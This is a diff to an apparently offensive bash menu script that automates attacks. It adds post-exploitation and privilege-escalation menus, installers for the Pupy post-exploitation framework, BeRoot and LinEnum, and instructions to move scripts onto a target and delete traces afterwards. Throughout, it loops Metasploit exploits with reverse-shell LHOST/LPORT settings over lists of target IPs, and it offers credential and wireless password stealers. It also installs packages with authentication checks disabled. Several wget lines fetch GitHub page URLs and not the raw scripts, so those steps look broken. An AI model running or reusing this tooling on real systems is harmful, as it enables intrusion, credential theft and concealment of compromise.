@@ -191,16 +191,17 @@ echo -e "\E[1;34m===\e[97m[9] \e[95mEmpire & DeathStar  \e[97m  [Pledge Your All
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[10]\e[31mWireless Attacks      \e[97m[Rule The Airwaves]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m===\e[97m[11]\e[90mData Exfiltration     \e[97m[Loot & Profit]   \E[1;34m"
+echo -e "\E[1;34m===\e[97m[11]\e[90mPost Exploitation     \e[97m[Loot & Profit]   \E[1;34m"
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[12]\e[32mMake Your Escape     \e[97m [Float Away...With The Rest Of The Garbage]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m===\e[97m[00]\e[34mReset & Recharge      \e[97m[Wipe All Scan Output To Lock A New Target]  \E[1;34m"
+echo -e "\E[1;34m===\e[97m[13]\e[34mPrivilege Escalation  \e[97m[PrivEsc Options & Techniques]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m:::\e[97m[0] \e[95mExit                  \e[97m[Exit ATAT]   \E[1;34m"
+echo -e "\E[1;34m===\e[97m[00]\e[95mReset & Recharge      \e[97m[Wipe All Scan Output To Lock A New Target]  \E[1;34m"
 tput sgr0
-#echo -e "\E[1;34m===\e[97m[15]\e[31mMasscan All TCP Ports \e[97m[Masscan all TCP Ports on Many Targets]   \E[1;34m"
-#tput sgr0
+echo -e "\E[1;34m:::\e[97m[0] \e[31mExit                  \e[97m[Exit ATAT]   \E[1;34m"
+tput sgr0
+
 echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
 echo -e "\e[97m~~~~~~~~~~~~~~~~~~ \e[31mProps to rand0m1ze for the concept!\e[97m~~~~~~~~~~~~~~~~~~\e[31m"
 tput sgr0
@@ -683,7 +684,7 @@ do
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
 	do
-	msfconsole -x "use $userexploit;\
+	msfconsole -q -x "use $userexploit;\
 	set LHOST $userhost;\
 	set LPORT $userport;\
 	set RHOST $IP;\
@@ -704,7 +705,7 @@ do
 
 	for PORT in $(cat $inputfile)
 	do
-	msfconsole -x "use $userexploit;\
+	msfconsole -q -x "use $userexploit;\
 	set LHOST $userhost;\
 	set LPORT $userport;\
 	set RHOST $usertarget;\
@@ -724,7 +725,7 @@ do
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
 	do
-	msfconsole -x "use $userexploit;\
+	msfconsole -q -x "use $userexploit;\
 	set LHOST $userhost;\
 	set LPORT $userport;\
 	set SRVPORT $srvport;\
@@ -746,7 +747,7 @@ do
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
 	do
-	msfconsole -x "use $userexploit;\
+	msfconsole -q -x "use $userexploit;\
 	set LHOST $userhost;\
 	set LPORT $userport;\
 	set SRVPORT $srvport;\
@@ -769,7 +770,7 @@ do
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
 	do
-	msfconsole -x "use exploit/multi/misc/java_jmx_server;\
+	msfconsole -q -x "use exploit/multi/misc/java_jmx_server;\
 	set LHOST $userhost;\
 	set LPORT $userport;\
 	set SRVPORT $srvport;\
@@ -791,7 +792,7 @@ do
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
 	do
-	msfconsole -x "use exploit/multi/misc/java_rmi_server;\
+	msfconsole -q -x "use exploit/multi/misc/java_rmi_server;\
 	set LHOST $userhost;\
 	set LPORT $userport;\
 	set SRVPORT $srvport;\
@@ -834,7 +835,7 @@ do
 
 	for PORT in $(cat $inputfile)
 	do
-	msfconsole -x "use $usermodule;\
+	msfconsole -q -x "use $usermodule;\
 	set RHOSTS $usertarget;\
 	set RPORT $PORT;\
 	run;\
@@ -851,7 +852,7 @@ do
 	targetfile=~/ATAT/MSF_targets.txt
 	for PORT in $(cat $inputfile)
 	do
-	msfconsole -x "use $usermodule;\
+	msfconsole -q -x "use $usermodule;\
 	set RHOSTS file:$targetfile;\
 	set RPORT $PORT;\
 	run;\
@@ -865,7 +866,7 @@ do
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
 	do
-	msfconsole -x "use auxiliary/scanner/snmp/snmp_enum;\
+	msfconsole -q -x "use auxiliary/scanner/snmp/snmp_enum;\
 	set RPORT $targetport;\
 	set RHOSTS $IP;\
 	set COMMUNITY $userstring;\
@@ -1051,8 +1052,8 @@ done
   echo -e "\E[1;34m::::: \e[97mCheck for Dependencies \E[1;34m:::::"
   echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!! \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
-options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "changeme Install" "Apt Update Fix" "Main Menu" "Quit") #"HostAPD-WPE via Github"
+PS3='Enter your choice: ENTER=Options Menu | 10=Main Menu | 11=QUIT: '
+options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "changeme Install" "Apt Update Fix" "Pupy Install" "BeRoot Install" "Main Menu" "Quit") #"HostAPD-WPE via Github"
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1081,7 +1082,7 @@ do
 		mkdir /tmp/ATAT/
 		echo ""
 
-	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk libatk-adaptor libgail-common bloodhound libxml2-dev libxslt1-dev unixodbc-dev"
+	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk libatk-adaptor libgail-common bloodhound libxml2-dev libxslt1-dev unixodbc-dev git libssl1.0-dev libffi-dev python-dev tcpdump python-virtualenv"
 	for i in $reqs; do
 		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
 		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
@@ -1180,6 +1181,18 @@ do
 		"Apt Update Fix")
 	rm -rf /var/lib/apt/lists && apt-get update && apt-get install kali-archive-keyring -y --allow-unauthenticated && apt-get install dirmngr --install-recommends -y --allow-unauthenticated && apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6
 	echo -e "\e[1;34m[*] Process Complete. This Should Only Ever Need To Be Run ONCE!\e[0m\n"
+			;;
+		"Pupy Install")
+	git clone --recursive https://github.com/n1nj4sec/pupy ~/pupy
+	cd ~/pupy
+	export PATH=$PATH:~/.local/bin
+	python create-workspace.py -DG pupyw
+	export PATH=$PATH:~/.local/bin
+			;;
+		"BeRoot Install")
+	git clone https://github.com/AlessandroZ/BeRoot ~/BeRoot
+	cd ~/BeRoot/Windows
+	pip install -r requirements.txt
 			;;
 		"Main Menu")
             ~/ATAT/ATAT.sh
@@ -1510,10 +1523,10 @@ done
 
  "11" | "11" )
          
- echo -e "\E[1;34m::::: \e[97mData Exfiltration \E[1;34m:::::"
+ echo -e "\E[1;34m::::: \e[97mPost Exploitation \E[1;34m:::::"
  
-PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
-options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Wireless Password Stealer" "Windows 64 bit Credenital & Loot Harvester" "Windows 32 bit Credenital & Loot Harvester" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 9=Main Menu | 10=QUIT: '
+options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Wireless Password Stealer" "Windows 64 bit Credenital & Loot Harvester" "Windows 32 bit Credenital & Loot Harvester" "Bashark" "Pupy" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1628,6 +1641,19 @@ do
 		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.json' /root/ATAT/ \e[97m\E[1;34m"
 		echo -e "\E[1;34m::::: \e[97mDon't Forget To Delete The \"credentials_xxxxxxxx_xxxxxx\" TXT & JSON Files & word_x86.exe \E[1;34m:::::"
 			;;
+		"Bashark")
+   	echo -e "\E[1;34m::::: \e[97mDownloading Bashark Post Exploitation Script... \E[1;34m:::::"
+         wget https://github.com/TheSecondSun/Bashark/blob/master/bashark.sh -O bash.sh
+    echo -e "\E[1;34m::::: \e[97mMove \"bash.sh\" To Target \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mType \"source bash.sh\" To Launch Bashark Framework \E[1;34m:::::"      
+            ;;
+        "Pupy")
+	echo -e "\E[1;34m::::: \e[97mLaunching Pupy Cross-Platform Post Exploitation Framework... \E[1;34m:::::"
+	cd ~/pupy
+	export PATH=$PATH:~/.local/bin
+	pupysh-update
+	pupysh
+		    ;;
         "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
@@ -1665,6 +1691,45 @@ do
         *) echo invalid option;;
     esac
 done 		      
+
+;;
+
+"13" | "13" )
+  # Accept upper or lowercase input.
+  echo -e "\E[1;34m::::: \e[97mPrivilege Escalation Methods \E[1;34m:::::"
+  PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
+options=("BeRoot Windows" "BeRoot Linux" "LinEnum" "Main Menu" "Quit" )
+select opt in "${options[@]}"
+do
+    case $opt in
+		"BeRoot Windows")
+	cd ~/BeRoot/Windows
+	cat README.md
+	echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
+			;;
+		"BeRoot Linux")
+	cd ~/BeRoot/Linux
+	cat README.md
+	echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
+			;;
+		"LinEnum")
+	echo -e "\E[1;34m::::: \e[97mDownloading LinEnum Privilege Escalation Checking Script... \E[1;34m:::::"
+            wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh -O en.sh
+    echo -e "\E[1;34m::::: \e[97mMove \"en.sh\" To Target \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mType \"./LinEnum.sh -r report -e /tmp/ \" To Launch A Quick LinEnum Scan \E[1;34m:::::" 
+	echo -e "\E[1;34m::::: \e[97mType \"./LinEnum.sh -r report -e /tmp/ -t\" To Launch A Thorough LinEnum Scan \E[1;34m:::::" 
+	echo -e "\E[1;34m::::: \e[97mYour Completed LinEnum Report Can Be Found On Your Target Here: /tmp/report \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mDon't Forget To Delete The Report On Your Target Once You're Done - \"rm /tmp/report\" \E[1;34m:::::"
+			;;
+		"Main Menu")
+            ~/ATAT/ATAT.sh
+            ;;
+        "Quit")
+            echo "Aufiederszehn" && exit 1
+            ;;
+        *) echo invalid option;;
+    esac
+done
 
 ;;
 
